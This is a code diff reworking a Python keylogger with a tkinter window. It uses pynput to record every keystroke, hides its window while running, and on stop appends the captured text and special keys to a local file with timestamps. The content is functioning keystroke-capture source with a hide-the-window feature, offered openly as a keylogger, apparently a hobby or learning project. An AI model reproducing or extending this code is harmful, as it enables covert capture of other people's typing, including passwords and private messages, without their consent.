@@ -1,78 +1,76 @@
-
-import tkinter as tk
 from tkinter import *
 from pynput import keyboard
-import json
+from datetime import datetime
 
-keys_used = []
-flag = False
-keys = ""
-
-def generate_text_log(key):
-    with open('key_log.txt', "w+") as keys:
-        keys.write(key)
-
-def generate_json_file(keys_used):
-    with open('key_log.json', '+wb') as key_log:
-        key_list_bytes = json.dumps(keys_used).encode()
-        key_log.write(key_list_bytes)
-
-def on_press(key):
-    global flag, keys_used, keys
-    if flag == False:
-        keys_used.append(
-            {'Pressed': f'{key}'}
-        )
-        flag = True
-
-    if flag == True:
-        keys_used.append(
-            {'Held': f'{key}'}
-        )
-    generate_json_file(keys_used)
+esc = []
+loggedText = ''
+specialChars = []
 
 
-def on_release(key):
-    global flag, keys_used, keys
-    keys_used.append(
-        {'Released': f'{key}'}
-    )
+def handleKeyPress(key):
+    global loggedText
+    try:
+        loggedText += str(key.char)
+        print(key.char)
+    except AttributeError as e:
+        specialChars.append(key)
+        print(specialChars)
+        if key == keyboard.Key.backspace:
+            loggedText = loggedText[:-1]
+        elif key == keyboard.Key.space:
+            loggedText += ' '
 
-    if flag == True:
-        flag = False
-    generate_json_file(keys_used)
-
-    keys = keys + str(key)
-    generate_text_log(str(keys))
+        if key == keyboard.Key.esc:
+            print(key)
+            try:
+                if len(esc) > 0:
+                    tk.deiconify()
+                else:
+                    esc.append(key)
+                    print('PRESS ESC AGAIN TO SHOW THE WINDOW')
+            except:
+                pass
+    liveTextBox.delete(1.0,END)
+    liveTextBox.insert(1.0,loggedText)
+def handleKeyRelease(key):
+    pass
 
 def start_keylogger():
-    global listener
-    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
+    tk.withdraw()
+    listener = keyboard.Listener(on_press=handleKeyPress , on_release=handleKeyRelease)
     listener.start()
-    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'keylogger.txt'")
-    start_button.config(state='disabled')
-    stop_button.config(state='normal')
+    # tk.destroy()
 
 def stop_keylogger():
-    global listener
-    listener.stop()
-    label.config(text="Keylogger stopped.")
-    start_button.config(state='normal')
-    stop_button.config(state='disabled')
+    onSaveTime = datetime.now().strftime('%H:%M:%S')
+    print(onSaveTime)
+    fileToSave = open('keylogger.txt','a')
+    fileToSave.write(f'{onSaveTime} -> {loggedText}\n\n')
+    fileToSave.write(f'{onSaveTime} -> {specialChars}\n\n\n')
+    print(loggedText)
+    fileToSave.close()
+    tk.destroy()
+    return False
 
-root = Tk()
-root.title("Keylogger")
+def hide():
+    print('hide')
+    tk.withdraw()
+tk = Tk()
+tk.title('KEYLOGGER')
+tk.geometry('300x300')
+tk.config(background='grey')
 
-label = Label(root, text='Click "Start" to begin keylogging.')
-label.config(anchor=CENTER)
-label.pack()
 
-start_button = Button(root, text="Start", command=start_keylogger)
-start_button.pack(side=LEFT)
+start_button = Button(tk, text="Start Keylogger", command=start_keylogger)
+start_button.pack(pady=10)
 
-stop_button = Button(root, text="Stop", command=stop_keylogger, state='disabled')
-stop_button.pack(side=RIGHT)
 
-root.geometry("250x250")
+stop_button = Button(tk, text="Stop Keylogger", command=stop_keylogger)
+stop_button.pack(pady=5)
 
-root.mainloop()
+hide_button = Button(tk, text="Hide", command=hide)
+hide_button.pack(pady=5)
+
+liveTextBox = Text(tk)
+liveTextBox.pack(pady=5)
+tk.mainloop()
